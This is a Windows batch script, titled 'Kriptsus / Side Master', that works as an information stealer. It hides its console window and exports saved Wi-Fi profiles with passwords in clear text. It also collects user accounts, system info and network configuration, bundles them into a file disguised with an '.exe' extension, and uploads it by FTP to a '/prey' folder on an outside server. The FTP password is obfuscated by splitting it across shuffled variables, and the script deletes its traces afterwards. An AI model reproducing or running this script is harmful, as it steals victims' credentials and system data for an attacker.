@echo off
title Kriptsus / Side Master
mode con cols=50 lines=1
mkdir "%tmp%/%username%"

set ER=ico
netsh wlan show all > "%tmp%/%username%/AllNetworks.txt"
netsh wlan export hostednetworkprofile
netsh wlan export profile folder=. key=clear

set ST=@t
type *.xml > "%tmp%/%username%/ProfileNetworks.txt"
del *.xml 

set MA=rm
net user >  "%tmp%/%username%/UserProfiles.txt"
net user "%username%" >> "%tmp%/%username%/UserProfiles.txt"
systeminfo > "%tmp%/%username%/SystemInfo.txt"

set DE=fo
ipconfig /all > "%tmp%/%username%/IpConfigAll.txt"
net config rdr > "%tmp%/%username%/NetConfigRdr.txt"

type "%tmp%/%username%/" *.txt > "%tmp%/%username%/%username%.exe"

set SI=In
echo open ftp.sidemasters.com> "%tmp%/%username%/Server.txt"
echo sidemasters.com>> "%tmp%/%username%/Server.txt"
echo %SI%%DE%%MA%%ST%%ER%>> "%tmp%/%username%/Server.txt"
echo cd /prey>> "%tmp%/%username%/Server.txt"
echo lcd "%tmp%/%username%">> "%tmp%/%username%/Server.txt"
echo binary>> "%tmp%/%username%/Server.txt"
echo send "%tmp%/%username%/%username%.exe">> "%tmp%/%username%/Server.txt"
echo ascii>> "%tmp%/%username%/Server.txt"
echo disconnect>> "%tmp%/%username%/Server.txt"
echo bye>> "%tmp%/%username%/Server.txt"

FTP -v -i -s:"%tmp%/%username%/Server.txt"
ping -n 5 0.0.0.0 > nul

rmdir /S /Q "%tmp%/%username%"

exit